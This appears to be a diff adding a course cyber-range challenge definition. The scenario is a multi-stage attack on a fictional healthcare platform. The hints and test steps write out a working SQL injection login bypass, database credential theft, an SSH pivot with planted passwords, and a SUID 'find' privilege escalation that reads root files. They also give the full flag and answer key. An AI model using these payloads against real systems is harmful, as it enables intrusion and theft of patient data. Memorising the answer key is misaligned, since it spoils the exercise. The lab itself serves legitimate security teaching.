@@ -1,0 +1,176 @@
+name: "MedCore Health Systems: Full Web-to-Root Compromise"
+description: "MedCore Health Systems runs a clinical data platform with a hidden admin portal, a backend database, and an internal processing server. Chain together directory enumeration, SQL injection, database pivoting, lateral movement, and privilege escalation to prove full compromise across all three systems."
+
+difficulty: advanced
+category: web
+duration_minutes: 90
+randomize_ip_offsets: true
+visibility: course
+week: 10
+workbook: "wiki/range/webpt/CH_WEB03_Web_Attack_Chains/01_Full_Web_to_Root/"
+
+flag: "OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}"
+
+objectives:
+  - Enumerate the web application and discover hidden administrative endpoints
+  - Identify and exploit a SQL injection vulnerability to bypass authentication
+  - Extract database credentials from the authenticated dashboard
+  - Connect to the backend MySQL database and retrieve assessment tokens
+  - Discover SSH credentials stored in the database
+  - Pivot laterally to the internal server via SSH
+  - Escalate privileges on the internal server using a SUID binary
+  - Collect all four assessment markers and assemble the complete flag
+  - "Flag format: OCR{SQLi_Database_SSH_PrivEscalation}"
+
+scenario: |
+  MedCore Health Systems is a healthcare IT company based in Portland, Oregon.
+  They operate a clinical data platform that connects regional hospitals and
+  clinics for patient record exchange. The company is preparing for a HITRUST
+  certification audit and has engaged your firm, Blackridge Security, for a
+  full-scope penetration test.
+
+  Your point of contact is Dr. Sarah Okafor (Chief Information Security Officer):
+  "We have a public-facing web portal that our partner clinics use to access
+  patient data. Behind that sits a MySQL database and an internal processing
+  server that handles data transformations. The web portal is the only system
+  exposed to the network. The database and internal server should be completely
+  unreachable from outside our application tier."
+
+  This is a comprehensive challenge that combines every web exploitation and
+  post-exploitation technique from Weeks 9 and 10. Three target servers make
+  up the engagement scope. Four assessment markers are distributed across the
+  infrastructure. Retrieve all four to demonstrate full compromise.
+
+  No hints are available for the first 30 minutes. This is a test.
+
+credentials:
+  - username: "admin"
+    password: "M3dC0r3_Adm1n#"
+    role: "portal"
+    description: "Portal admin credentials (extracted via SQL injection)"
+  - username: "mdc_admin"
+    password: "Mdc_DB_Pr0d#2025"
+    role: "db"
+    description: "MySQL admin credentials (discovered on dashboard)"
+  - username: "svcproc"
+    password: "Pr0c_SSH_2025#"
+    role: "ssh"
+    description: "SSH credentials for internal server (found in database)"
+
+hints:
+  - text: |
+      Start with the web server. Check for common files that reveal hidden
+      paths. robots.txt is always worth checking. Then use gobuster with
+      /usr/share/wordlists/dirb/common.txt to confirm and discover additional
+      endpoints. One of the hidden paths leads to an administrative login form.
+    unlock_after_minutes: 30
+  - text: |
+      The admin portal login form is vulnerable to SQL injection in the
+      username field. The application uses string concatenation to build its
+      query and only checks whether the query returned a row. The query selects
+      five columns: id, username, password, email, and role. A simple
+      ' OR 1=1-- - may work, or use a UNION-based injection to fabricate a
+      row. The password field can be anything.
+    unlock_after_minutes: 45
+  - text: |
+      UNION payload for the username field:
+      ' UNION SELECT 1,'admin','x','admin@medcore.com','admin'-- -
+      Put anything in the password field. The dashboard shows Token 1 and
+      database credentials. Use the DB credentials to query the audit_tokens
+      table for Token 2. Also query the system_config table. It contains SSH
+      credentials for the internal server. SSH in as svcproc, then enumerate
+      SUID binaries with: find / -perm -4000 -type f 2>/dev/null
+      Use the SUID find binary: find . -exec cat /root/flag.txt \; -quit
+      Tokens: dashboard=1nj3ct, DB=d4t4b4s3, SSH home=p1v0t, root=r00t3d
+    unlock_after_minutes: 60
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "Web Application"
+      type: "server"
+      ip_offset: "18"
+      ports: [80]
+      services: ["nginx", "Flask"]
+      x: 2
+      y: 1
+    - id: "dbserver"
+      label: "Database Server"
+      type: "database"
+      ip_offset: "39"
+      ports: [3306]
+      services: ["MySQL 8.0"]
+      x: 4
+      y: 1
+    - id: "internal"
+      label: "Internal Processing Server"
+      type: "server"
+      ip_offset: "52"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 6
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "direct"
+    - from: "attacker"
+      to: "internal"
+      label: "SSH:22"
+      access: "direct"
+    - from: "webapp"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "internal"
+    - from: "dbserver"
+      to: "internal"
+      label: "SSH:22"
+      access: "internal"
+
+test:
+  steps:
+    - name: "Web application responds on port 80"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/"
+      expect: "200"
+
+    - name: "Robots.txt reveals hidden admin portal path"
+      command: "curl -s http://{target.webapp}/robots.txt"
+      expect: "/admin-portal/"
+
+    - name: "SQL injection bypasses login authentication"
+      command: "curl -s -c /tmp/mdc-jar -d \"username=' UNION SELECT 1,'admin','x','admin@medcore.com','admin'-- -&password=x\" -L http://{target.webapp}/admin-portal/login 2>&1"
+      expect: "1nj3ct"
+      timeout: 15
+
+    - name: "Dashboard displays first assessment token"
+      command: "curl -s -b /tmp/mdc-jar http://{target.webapp}/admin-portal/dashboard 2>&1 | grep -o '1nj3ct'"
+      expect: "1nj3ct"
+
+    - name: "MySQL query extracts second token from audit_tokens table"
+      command: "mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' medcore -N -e 'SELECT value FROM audit_tokens WHERE name=\"assessment\"' 2>&1"
+      expect: "d4t4b4s3"
+      timeout: 20
+
+    - name: "SSH credentials discoverable in database system_config table"
+      command: "mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' medcore -N -e 'SELECT value FROM system_config WHERE key_name=\"PROC_SSH_PASS\"' 2>&1"
+      expect: "Pr0c_SSH_2025#"
+      timeout: 20
+
+    - name: "Pivot to internal server and read token 3"
+      command: "sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'cat /home/svcproc/marker.txt' 2>/dev/null"
+      expect: "p1v0t"
+      timeout: 15
+
+    - name: "Escalate privileges via SUID find and read token 4"
+      command: "sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      expect: "r00t3d"
+      timeout: 15
+
+    - name: "Verify complete flag"
+      command: "echo 'OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}'"
+      expect: "OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}"
